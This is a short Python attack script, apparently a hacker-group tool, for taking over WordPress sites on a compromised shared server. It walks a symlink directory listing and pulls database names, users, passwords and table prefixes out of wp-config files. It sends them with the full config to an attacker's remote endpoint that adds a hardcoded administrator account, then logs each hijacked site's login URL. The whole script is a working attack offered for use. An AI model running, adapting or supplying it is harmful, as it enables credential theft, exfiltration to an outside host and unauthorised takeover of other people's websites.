#!/usr/bin/python

"""
                             RpQ#AdM
                           EQ#d@F Xe Q
                       MgKG eeeXX  eW
                   BNKGXeeX        eW   BEpqNg#mbAAAAbm#WQpB
                RNDUeeX            XFDPU eeeeeeeeeeeeeeeee U@ANB
              MAFeeX               XeU@dKKKdD@GU XeXX      XXeeUW
            qDXeX                 XUN         RBMNmK@F        UeA
          M8Xe                   XFp                 M         XM
        RKXe                     XM                R be       e#
       qFe                      eb                  p       Xe#
      #XX                      XFR                 BGX     eFQ
     be                        eb                 EPX    e AB
    me                 XXXXXXXX p                NUX   eXDM
   NX         XXeeeeXX UFGPPGG @               pdXXXee dM    R       R
  BFX       X G@dbgNqpEBR    RBE            RQDXee F8mE    EdGE     Rdp
  beXeXX   XFp                           pgD TXPAWMR     Bb XeA      dFR
 BXXPbqdX  XM  R                     pgDFXXPbQB        pbUeX X@      gTm
 qbM   8X XFWKPUDR               pgDUX PbQB         BWD eX   X8      geFB
      me    eeX Tb           pWdFeXPbQB        BpQm8Uee      eb      beXQ
     RGX        eD       BNKP Te8WB      BqgA8GU eeeX        XM      PXem
     BU         em    p#8UeXeXKp      Mm8UXeeXXX            eD      ge em
      De       eG  pm@ eXX XPM     EmPXeXX                   M     N   eW
      BKUeeeeeXdEN8 eX    e8R    RbUeX U                   em    BKXX XUB
        BQgmmNpWPeX      XFB    R8eXXXeeeeeeeeeXX         e@R   QFe  XeW
             p@eX        eK     QTXUPDAb#ggg#bK8G ee     XUp   gXX  XUN
          R QXe          XK     BgqB            REqAU  X XN   Ne   XPB
           RFX          Ue N          RRRRRRR    RND eXG eF#R FX    p
           E           XK#GeUKNB             RpgD TTUKq MKUTFK      E
           E  eXXX      XW pm@UUGDbgNqqqQW#K@UeTeGKNB     BgFe     eD
           RGe8qQGeX     eb   RMWA8PGFU   UFPdmQp    R   R  8X      ePp
            qQ   RmUeX    e@q         RBBR             MgM EU     XeUKp
                   BbUeX   XXDQ                    BQKGDM  RFX  XeUbE
                     B#PXeX  XXGKNpR         BpQ#KPXe@Q     #TXeUbB
                        qKFXeX XeX FP8ddKdD@PF eTT KM        #FmB
                          RQAPUXeeeeeeeeeeeeeeXFdNR
                              EQ#A8PGFFFFG@DbWMR
                                    RBBBRR

                           ./Xi4u7 - idiot people
                  Wordpress Add Administrator - PHP 7 Only
"""

import re
import sys
import requests
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

mati = 12

user = "AndroXghosT" # Change If You Want
pwd = "JancoxSc0de"
head = {"User-agent":"Linux Mozilla 5/0"}
urlsym1 = raw_input("urlsym > ")
urlsym = urlsym1+"/"
api = raw_input("urlapi > ")
text1 = requests.get(urlsym, headers=head).text
list = re.findall('<a href="(.*?)">', text1)
for i in list:
        if "-Wordpress" in i:
                print("\033[43;1m["+i+"]\033[0m"),
                conf = requests.get(urlsym+i).text
                try:
                        dbuser = re.findall("DB_USER', '(.*?)'", conf)[0]
                        dbpass = re.findall("DB_PASSWORD', '(.*?)'", conf)[0]
                        dbname = re.findall("DB_NAME', '(.*?)'", conf)[0]
                        dbprefix = re.findall("table_prefix = '(.*?)';", conf)[0]
                        data = {"user_baru":user,"pass_baru":pwd,"config":conf,"hajar":"hajar","dbuser":dbuser, "dbpass":dbpass, "dbname":dbname, "dbprefix":dbprefix}
                        text = requests.post(api, data=data, headers=head, verify=False, timeout=mati).text
                except:
                        print("EXCEPT")
                        continue
                if "color=lime>sukses" in text or "color=red><" in text:
                        print("\033[42;1m[USER CHANGED]\033[0m"),
                        ua = "./Xi4u7 Tools 8/0"
                        trgt = re.findall("Login => <a href='(.*?)/wp-login.php' target='_blank'>", text)
                        print("["+trgt[0]+"]"),
                        print("[USER: "+user+"][PASS: "+pwd+"]")
                        jj = open('change.log', 'a')
                        jj.write(trgt[0]+"\n")
                        jj.close()
                else:
                        print("\033[41;1m[USER NOT CHANGED]\033[0m")
